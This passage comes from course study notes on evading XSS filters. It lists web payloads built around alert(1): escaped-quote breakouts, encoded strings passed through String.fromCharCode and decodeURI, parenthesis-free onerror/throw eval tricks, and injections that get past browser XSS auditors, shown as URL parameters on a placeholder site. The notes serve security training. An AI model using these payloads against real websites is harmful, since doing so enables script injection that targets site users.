+</code></pre><ul id="b0fae092-363c-492e-bc63-56754f521244" class="bulleted-list"><li style="list-style-type:disc">it all depends on the filter that we are facing</li></ul><p id="a29270f4-ab91-4d3c-962b-41729b7c330a" class="">→ moreover: https://els-cdn.content-api.ine.com/eda3ac9d-554a-469a-98c6-639c90f0c7a5/index.html#</p><h3 id="6678e303-f8b2-4201-9187-dd6541b0bcfe" class=""><strong>Escaping Quotes</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#escaping-quotes"></a></strong></h3><ul id="94f60d74-803a-431f-867b-50c9a0637409" class="bulleted-list"><li style="list-style-type:disc">Filters place the backslash char <em>*</em> before quotes to escape that kind of character</li></ul><p id="0f2735e0-826b-4f9d-b86f-1df5f7a00872" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1e540be1-ac4a-49ef-9896-e4aaad542996" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">randomkey\&#x27; alert(1);  # escape the apostrophe
+randomkey\\&#x27; alert(1); # escape the backslash
+</code></pre><p id="eb5b82c7-c245-42ba-b1d0-321f372d6b02" class="">One of useful Javascript methods is:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cbb756a2-a111-4eb0-b421-20e06bedcb93" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">String.fromCharCode()
+</code></pre><p id="f5845cf1-a9d6-46b1-be40-267dc14311ff" class="">It allows us to generate strings starting from a sequence of Unicode values:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c5c68ace-53a5-4d94-ac5e-cb61bd226491" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">String.fromCharCode(120,115,9416)
+
+# u+0078 Latin Small Letter x
+# u+0073 Latin small Letter s
+# u+24C8 Circled Latin capital letter (S)
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f7ff5555-fee6-4d97-98e6-7d01e10e3e15" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">/your string/.source  //space allowed
+43804..toString(36)   //spaces not allowed in Base36
+</code></pre><p id="805fb0a2-690c-47d3-8c9b-36d253e59a14" class="">Using unescape method:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bc090a4c-dc49-4d26-8a9b-22465e5d8ce6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">unescape(/%78%u0073%73/.source) //its deprecated
+</code></pre><p id="656d1e90-9439-42c0-8137-0a0f077378b1" class="">Using decodeURI and decodeURIComponent:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d36bc18e-a573-44e6-9e45-61137aa1bc56" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># in this case, characters needs to be URL-encoded to avoid URI malformed errors
+
+decodeURI(/alert(%22xss%22)/.source)
+decodeURIcomponent(/alert(%22xss%22)/.source)
+</code></pre><ul id="bd0253e4-2a75-4684-9f63-6ecdae731615" class="bulleted-list"><li style="list-style-type:disc">These methods could be useful if you can inject into a script or event handler. nut you cannot use quotation marks because they are properly escaped.</li></ul><ul id="dfd3a34e-1a3d-42cb-9f61-6fe15ab36f9e" class="bulleted-list"><li style="list-style-type:disc">Dont forget that each of them will return a string, so you need an execution <strong>sink</strong> to trigger the code (IE: <strong>eval</strong>)</li></ul><h3 id="0f159c6c-3669-46bf-8018-b1cbaefa480e" class=""><strong>Escaping Parentheses</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#escaping-parentheses"></a></strong></h3><ul id="52fd70dd-f589-4289-94bc-3b4b7adcd368" class="bulleted-list"><li style="list-style-type:disc">The technique abuses the onerror handler, assigning a function to call once an error has been generated using throw followed by the arguments to the function assigned to the error handler.</li></ul><p id="9492a55a-0a1c-4b2a-8d3c-339c01c24176" class="">→ moreover: http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8c84e6ce-0eb4-4ea8-bc10-d1be4e6e610e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;img src=x onerror=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;&quot;&gt;
+# eval - function to invoke in case of error
+# throw - generate the error
+# alert... - parameters For the error function
+
+onerror=alert;throw 1; // a simple version
+# does not work in Firefox and IE
+</code></pre><p id="1889f385-7fc3-4482-b62a-3bd2a11cdda8" class="">And since the arguments section is quoted, its possible to do some encoding like the following:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eaba8710-6972-4af6-9847-fae9b0e207b7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;img src=x onerror=&quot;window.onerror=eval;throw&#x27;\u003d&amp;#x006C;ert&amp;#x0028;18#41;&#x27;&quot;/&gt;
+</code></pre><h2 id="d20c1bf3-82bb-42da-92e7-d170928c57c9" class=""><strong>Bypassing Browser Filters</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#bypassing-browser-filters"></a></strong></h2><p id="7fd1cfca-9b02-46fc-be25-14367da7edfb" class="">They dont cover all possible XSS attack scenarios and they focus on Reflected type of XSS.</p><h3 id="e74e5762-c736-4cc4-9d3c-7daaf05bfbc5" class=""><strong>UnFiltered Scenarios - Injecting Inside HTML Tag</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#unfiltered-scenarios---injecting-inside-html-tag"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b5e23a7e-4330-4866-aa05-851ac81df9fb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;svg/onload=alert(1)&gt; # its detected by all main filters
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="319d95ba-c207-4781-8afb-77e71299af93" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Just by removing the final (&gt;) we jave a bypass For browsers with XSSAuditor
+&lt;svg/onload=alert(1) // works chromium based browser
+</code></pre><p id="bcfeb07f-1a6b-4fd3-ae57-b277fbe0349d" class="">Injecting inside HTML Tag Attributes:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="10df7aaf-ec1d-433a-99eb-b9532ac57ea4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">site.com/inject?x=giuseppe&quot;&gt;&lt;svg/onload=alert(1)&gt;
+</code></pre><p id="309b16f2-52ab-4775-9dd2-c3bd857f31c1" class="">We can bypass WebKit with:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b8f0a676-4625-4b91-95e4-a242a9a6c9ba" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">site.com/inject?x=giuseppe&quot;&gt;&lt;a/href=&quot;data:text/html;base64,&lt;base64 payload&gt;&quot;&gt;clickhere&lt;!--
+</code></pre><p id="d2e88067-f399-4403-a3f0-f16b2676e525" class="">Injecting Inside SCRIPT Tag:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1b70de14-da44-4a82-9a95-85e09e2ae783" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">site.com/inject?name=belucci&quot;;alert(1);//
+</code></pre><p id="ed5784ac-43a3-4a50-a184-861bc33f2479" class="">Injecting Inside Event Attributes:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d32a6728-74ef-4860-8725-49712c56ffb0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">site.com/inject?roomID=alert(1)
+</code></pre><p id="bf763c8e-f4c1-4d16-a325-45128d41e718" class="">DOM Based:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ee5a4e5d-6e39-47a7-bb3d-04f4b81ce65c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">site.com/inject?next=javascript:alert(1)
+</code></pre><ul id="f0749331-f352-46b7-a8bf-f644dbfa767a" class="bulleted-list"><li style="list-style-type:disc">DOM Based, there are other scenarios that are not covered by browsers filters.</li></ul><blockquote id="20e40013-bb87-4493-813a-8c1714b07c33" class="">For example, fragmented vectors in multiple GET parameters or attacks that are not reflected in the same page, mXSS, etc.</blockquote></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
